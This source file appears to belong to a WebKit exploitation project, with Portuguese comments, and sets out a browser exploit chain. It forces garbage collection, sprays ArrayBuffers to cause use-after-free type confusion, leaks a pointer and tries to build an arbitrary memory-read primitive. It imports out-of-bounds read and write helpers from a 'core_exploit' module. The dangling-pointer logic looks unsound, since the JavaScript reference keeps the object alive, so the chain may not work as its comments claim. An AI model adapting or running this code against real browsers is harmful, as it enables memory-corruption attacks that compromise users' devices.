// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R54 - Hyper GC & Type Variation)
// =======================================================================================
// ESTA VERSÃO RETORNA À ESTRATÉGIA DO R52, MAS COM UMA ABORDAGEM MUITO MAIS AGRESSIVA
// PARA FORÇAR O GARBAGE COLLECTOR (GC).
// - A função triggerGC foi tornada mais caótica para forçar uma coleta completa.
// - O objeto 'victim' agora usa números em vez de BigInts para variar seu padrão de alocação.
// - Múltiplas chamadas ao GC são feitas para maximizar a chance de liberar a memória.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R54_Hyper_GC";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R54 - Hyper GC)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Hyper GC & Type Variation (R54) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];

    try {
        // FASE 1: Limpeza agressiva inicial do heap.
        logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
        await triggerGC_Hyper(); // Nova função de GC

        // FASE 2: Criar o Ponteiro Pendurado (Dangling Pointer)
        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = sprayAndCreateDanglingPointer(); // Agora cria um objeto com números
        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        
        // FASE 3: Múltiplas tentativas de forçar a Coleta de Lixo
        logS3("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerGC_Hyper();
        await PAUSE_S3(100); // Pequena pausa para o thread do GC
        await triggerGC_Hyper();
        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");

        // FASE 4: Pulverizar sobre a memória liberada para obter confusão de tipos
        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        for (let i = 0; i < 1024; i++) {
            const buf = new ArrayBuffer(136); 
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n;
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando a confusão de tipos...`, "info");

        // FASE 5: Encontrar a referência corrompida e extrair os ponteiros
        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");

        if (typeof dangling_ref.corrupted_prop !== 'number') {
            // Se o tipo ainda for 'object', pode ser que o objeto não tenha sido liberado.
            // Se for 'undefined' ou outro, a memória pode ter sido zerada.
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");

        const leaked_ptr_double = dangling_ref.corrupted_prop;
        const buf_conv = new ArrayBuffer(8);
        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
        const int_view = new Uint32Array(buf_conv);
        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
        
        // FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária
        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
        // ... (lógica da FASE 6 permanece a mesma) ...
        let corrupted_buffer = null;
        for (const buf of spray_buffers) {
            const view = new BigUint64Array(buf);
            if (view[0] !== 0x4141414141414141n) {
                logS3("Encontrado o ArrayBuffer corrompido pela confusão de tipos!", "good");
                corrupted_buffer = buf;
                break;
            }
        }

        if (!corrupted_buffer) {
            throw new Error("Não foi possível encontrar o buffer corrompido entre os pulverizados.");
        }

        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 
        dangling_ref.prop_b = int64ToDouble(target_address_to_read);

        const hacked_view = new DataView(corrupted_buffer);
        const read_value = hacked_view.getUint32(0, true); 

        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
            leaked_addr: leaked_addr.toString(true),
            arb_read_test_value: toHex(read_value)
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF ---

// *** MUDANÇA R54: Função de GC muito mais agressiva ***
async function triggerGC_Hyper() {
    logS3("    Acionando GC Agressivo (Hyper)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 1000; i++) {
            // Aloca objetos de tamanhos variados para "sujar" diferentes pools de memória
            gc_trigger_arr.push(new ArrayBuffer(1024 * i)); 
            gc_trigger_arr.push(new Array(1024 * i).fill(0));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Hyper, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;

    function createScope() {
        // *** MUDANÇA R54: Usar números normais em vez de BigInts ***
        // Isso pode mudar como o objeto é alocado e coletado pelo GC.
        const victim = {
            prop_a: 0x11111111, prop_b: 0x22222222, 
            corrupted_prop: 0.12345, // Usando um double
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0 // Ajustando o tamanho para 136 bytes
        };
        dangling_ref_internal = victim; 
        
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    
    createScope();
    return dangling_ref_internal;
}
